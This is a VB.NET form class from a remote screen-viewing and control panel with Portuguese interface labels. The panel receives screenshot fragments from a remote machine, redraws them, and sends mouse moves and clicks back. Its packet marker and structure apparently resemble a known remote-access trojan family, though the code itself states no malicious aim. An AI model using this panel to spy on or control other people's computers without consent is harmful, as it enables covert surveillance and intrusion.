Public Class Cap

    Public F As MdClient
    Public Sz As Size

    Private Sub Cap_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        For i As Integer = 0 To 13
            C1.Items.Add(QZ(i))
        Next
        For i As Integer = 1 To 10
            C2.Items.Add(i)
        Next
        P1.Image = New Bitmap(Sz.Width, Sz.Height)
        C1.SelectedIndex = 4
        C2.SelectedIndex = 4
    End Sub

    Public Sub PktToImage(ByVal BY As Byte())
        If btnIniciar.Text = "Parar" Then
            F.Send("Meu@" & MdSokserver.Y & C1.SelectedIndex & MdSokserver.Y & C2.Text & MdSokserver.Y & C.Value)
        End If
        If op = Nothing Then

        Else
            If btnIniciar.Text = "Parar" Then
                Dim pp As New Point(0, 0)
                pp.X = op.X
                pp.Y = op.Y
                op = Nothing
                F.Send("EnviarMauserMove" & MdSokserver.Y & pp.X & MdSokserver.Y & pp.Y & MdSokserver.Y)
            End If
        End If
        Dim B As Array = fx(BY, "njq8")
        Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
        Dim L As Bitmap = Image.FromStream(Q)
        Dim QQ As String() = Split(BS(B(0)), ",")

        lbStatus.Text = "Status : Baixando " & SetBytes(BY.LongLength) & ", FPS : " & QQ.Length - 2

        Dim K As Bitmap = P1.Image.GetThumbnailImage(CType(Split(QQ(0), ".")(0), Integer), CType(Split(QQ(0), ".")(1), Integer), Nothing, Nothing)
        Dim G As Graphics = Graphics.FromImage(K)
        Dim tp As Integer = 0
        For i As Integer = 1 To QQ.Length - 2
            Dim P As New Point(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1))
            Dim SZ As New Size(L.Width, Split(QQ(i), ".")(2))
            G.DrawImage(L.Clone(New Rectangle(0, tp, L.Width, CType(Split(QQ(i), ".")(2), Integer)), L.PixelFormat), New Point(CType(Split(QQ(i), ".")(0), Integer), CType(Split(QQ(i), ".")(1), Integer)))
            If CheckBox1.Checked Then
                Dim r As New Rectangle(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1), SZ.Width, SZ.Height)
                G.DrawRectangle(Pens.Red, r)
            End If
            tp += SZ.Height
        Next
        G.Dispose()
        P1.Image = K
    End Sub

    Function SetBytes(Bytes) As String
        On Error GoTo hell
        If Bytes >= 1073741824 Then
            SetBytes = Format(Bytes / 1024 / 1024 / 1024, "#0.00") _
                 & " GB"
        ElseIf Bytes >= 1048576 Then
            SetBytes = Format(Bytes / 1024 / 1024, "#0.00") & " MB"
        ElseIf Bytes >= 1024 Then
            SetBytes = Format(Bytes / 1024, "#0.00") & " KB"
        ElseIf Bytes < 1024 Then
            SetBytes = Fix(Bytes) & " Bytes"
        End If
        Exit Function
hell:
        SetBytes = "0 Bytes"
    End Function

    Function QZ(ByVal q As Integer) As Size '  Lower Size of image
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function

    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseDown
        If CheckBox2.Checked = True Then
            Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 2
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 8
            End If
            F.Send("EnviarClickMauser" & MdSokserver.Y & PP.X & MdSokserver.Y & PP.Y & MdSokserver.Y & but)
        End If
    End Sub

    Private Sub P1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseUp
        If CheckBox2.Checked = True Then
            Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 4
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 16
            End If
            F.Send("EnviarClickMauser" & MdSokserver.Y & PP.X & MdSokserver.Y & PP.Y & MdSokserver.Y & but)
        End If

    End Sub

    Dim op As New Point(1, 1)

    Private Sub P1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseMove
        If CheckBox2.Checked = True Then
            If btnIniciar.Text = "Parar" Then
                Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
                If PP <> op Then
                    op = PP
                End If
            End If
        End If
    End Sub

    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function

    Function BS(ByVal b As Byte()) As String ' byte() to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function

    Private Sub btnSalvar_Click(sender As Object, e As EventArgs) Handles btnSalvar.Click
        Dim s As New SaveFileDialog
        s.Title = "CORINGÃO"
        s.Filter = "ARQUIVOS (*.png)|*.png"
        If s.ShowDialog = Windows.Forms.DialogResult.OK Then
            P1.Image.Save(s.FileName, System.Drawing.Imaging.ImageFormat.Png)
        End If
    End Sub

    Private Sub btnIniciar_Click(sender As Object, e As EventArgs) Handles btnIniciar.Click
        If btnIniciar.Text = "Iniciar" Then
            F.Send("Meu@" & MdSokserver.Y & C1.SelectedIndex & MdSokserver.Y & C2.Text & MdSokserver.Y & C.Value)
            btnIniciar.Text = "Parar"
        Else
            btnIniciar.Text = "Iniciar"
        End If
    End Sub

End Class